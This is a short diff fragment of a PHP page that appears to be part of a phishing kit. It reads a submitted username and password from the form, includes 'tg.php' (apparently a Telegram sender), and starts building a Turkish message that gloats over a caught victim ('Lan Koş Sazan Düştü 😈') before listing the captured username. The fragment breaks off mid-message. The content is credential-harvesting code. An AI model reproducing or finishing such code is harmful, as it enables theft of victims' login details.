@@ -2,14 +2,10 @@
 <?php
 include('tg.php');
 
-$id=$_GET["id"];
 if($_POST){
 $id= $_POST['id'];
-header("location: login.php?id=$id");
 
 $password=$_POST["password"];
-header("location: password.php?id=$id");
-
 $data = [
   'text' => '➡️ Lan Koş Sazan Düştü 😈 
 Kullanıcı Adı : '.$id.'
